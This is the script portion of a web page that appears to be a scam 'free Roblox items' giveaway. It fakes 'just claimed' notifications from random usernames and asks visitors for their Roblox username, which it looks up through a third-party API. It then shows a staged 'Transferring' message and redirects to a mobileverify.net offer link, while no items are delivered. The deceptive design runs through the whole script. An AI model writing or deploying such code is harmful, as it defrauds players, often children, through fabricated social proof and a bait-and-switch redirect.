            if (popupOpen) return;
            notificationInterval = setInterval(function() {
                if (popupOpen) return;
                $(".cliameds").fadeIn();
                var html = `
          <div class="message">
            <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
            <div class="more">
              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
              <div> JUST CLAIMED '${items[Math.floor(Math.random() * items.length)]}'</div>
            </div>
          </div>
        `;
                $(".cliameds").html(html);
                setTimeout(function() {
                    $(".cliameds").fadeOut();
                }, 3000);
            }, 5000);
        }

        function stopNotifications() {
            clearInterval(notificationInterval);
            $(".cliameds").fadeOut();
        }
        startNotifications();

        const showPurchasePopup = (itemName, itemImages) => {
            popupOpen = true;
            stopNotifications();
            const popup = document.getElementById('purchase-popup');
            const popupContent = popup.querySelector('.popup-content');

            const selectedCount = itemImages.length;
            const promptText = selectedCount > 1 ?
                `Would you like to get these ${selectedCount} items?` :
                `Would you like to Get "<span>${itemName}</span>"?`;

            let imagesHTML = '<div class="selected-images-container">';
            itemImages.forEach(src => {
                imagesHTML += `<img src="${src}" alt="Selected Item" class="item-popup-image-small">`;
            });
            imagesHTML += '</div>';

            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Item(s)</h3>
        </div>
        ${imagesHTML}
        <p class="item-confirm">${promptText}</p>
        <div class="input-group">
          <input type="text" id="username-input" placeholder="Enter your Roblox username">
        </div>
        <div class="user-error d-none">Please enter a valid username</div>
        <div class="popup-buttons">
          <button class="cancel-btn">Cancel</button>
          <button class="free-btn" id="search-user-btn">
            <span class="free-icon"></span>
            <span class="free-badge">Free</span>
          </button>
        </div>
      `;
            popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
            popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
                const clickSound = document.getElementById('clickSound');
                clickSound.currentTime = 0;
                clickSound.play();
                const username = document.getElementById('username-input').value.trim();
                if (!username) {
                    document.querySelector('.user-error').classList.remove('d-none');
                    return;
                }
                showSearchingState(username, itemName, itemImages);
            });
            popup.style.display = 'flex';
            document.getElementById('username-input').focus();
        }
        const closePurchasePopup = () => {
            document.getElementById('purchase-popup').style.display = 'none';
            popupOpen = false;
            startNotifications();
        }
        const showSearchingState = (username, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Item(s)</h3>
        </div>
        <div style="text-align:center;padding:20px">
          <div class="folding">
            <div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div>
          </div>
          <p class="searching-text">Searching for @${username}</p>
        </div>
      `;
            fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "SUCCESS") {
                        showSuccessState(username, data.avatar, itemName, itemImages);
                    } else {
                        showErrorState(username, itemName, itemImages);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    showErrorState(username, itemName, itemImages);
                });
        }
        const showSuccessState = (username, avatarUrl, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Get Item(s)</h3>
        </div>
        <div style="text-align:center;padding:20px">
          <img src="${avatarUrl}" class="result-avatar">
          <p class="result-username">@${username}</p>
          <button class="get-item-now-btn">Continue</button>
        </div>
      `;
            popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
                const clickSound = document.getElementById('clickSound');
                clickSound.currentTime = 0;
                clickSound.play();
                showVerificationState(username, itemName, itemImages);
            });
        }
        const showVerificationState = (username, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            const selectedCount = itemImages.length;
            const transferText = selectedCount > 1 ?
                `Transferring your selected items to @${username}` :
                `Transferring ${itemName} to @${username}`;

            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Verification</h3>
        </div>
        <div style="text-align:center;padding:20px">
          <div class="folding">
            <div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div>
          </div>
          <p class="searching-text">${transferText}</p>
        </div>
      `;
            setTimeout(() => {
    window.location.href = "https://mobileverify.net/cl/i/dv6dmw";
    closePurchasePopup();
}, 3000);

        }
        const showErrorState = (username, itemName, itemImages) => {
            const popupContent = document.querySelector('.popup-content');
            popupContent.innerHTML = `
        <div class="popup-header">
          <h3>Error</h3>
        </div>
        <div style="text-align:center;padding:20px">
          <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
          <button class="get-item-now-btn" id="retry-btn">Try Again</button>
        </div>
      `;
            popupContent.querySelector('#retry-btn').addEventListener('click', function() {
                showPurchasePopup(itemName, itemImages);
            });
        }

        // --- START: MODIFIED SCRIPT ---
        $(document).ready(function() {
            const dingSound = document.getElementById('dingSound');
            const MAX_SELECTIONS = 3;
            const $limitMessage = $('#selection-limit-message');

            // Item Selection Logic
            $('.item-card').click(function() {
                const $this = $(this);
                const isSelected = $this.hasClass('selected');
                const selectedCount = $('.item-card.selected').length;

                $limitMessage.hide();

                if (isSelected) {
                    $this.removeClass('selected');
                } else {
                    if (selectedCount < MAX_SELECTIONS) {
                        $this.addClass('selected');
                        dingSound.currentTime = 0;
                        dingSound.play();
                    } else {
                        $limitMessage.show();
                        setTimeout(() => {
                            $limitMessage.fadeOut();
                        }, 2500);
                    }
                }

                if ($('.item-card.selected').length > 0) {
                    $('#continue-btn').show();
                } else {
                    $('#continue-btn').hide();
                }
            });

            // Continue Button Click Logic
            $('#continue-btn').click(function() {
                const selectedItems = $('.item-card.selected');
                if (selectedItems.length === 0) return;

                const itemNames = selectedItems.map(function() {
                    return $(this).find('.item-name').text().trim();
                }).get().join(', ');

                const itemImages = selectedItems.map(function() {
                    return $(this).find('.item-img').attr('src');
                }).get();

                showPurchasePopup(itemNames, itemImages);
            });
        });
        // --- END: MODIFIED SCRIPT ---
    </script>
</body>
</html>
